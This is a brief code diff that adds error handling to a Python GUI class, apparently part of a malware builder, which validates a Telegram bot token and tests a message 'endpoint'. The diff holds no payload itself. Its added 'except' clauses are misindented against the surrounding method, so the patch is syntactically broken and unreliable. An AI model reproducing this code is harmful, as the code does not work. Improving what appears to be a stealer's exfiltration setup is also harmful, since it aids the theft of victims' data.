@@ -1442,6 +1442,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         if not result.get("ok"):
             messagebox.showerror(APPLICATION_NAME, "Invalid bot token!")
             return
+except URLError:
+    messagebox.showerror(APPLICATION_NAME, "Failed to connect to the Telegram API!")
+    return
+except Exception as e:
+    messagebox.showerror(APPLICATION_NAME, f"An error occurred: {str(e)}")
+    return
                     
                     # Test sending a message
                     test_message = urllib.parse.quote("Your endpoint is working!")
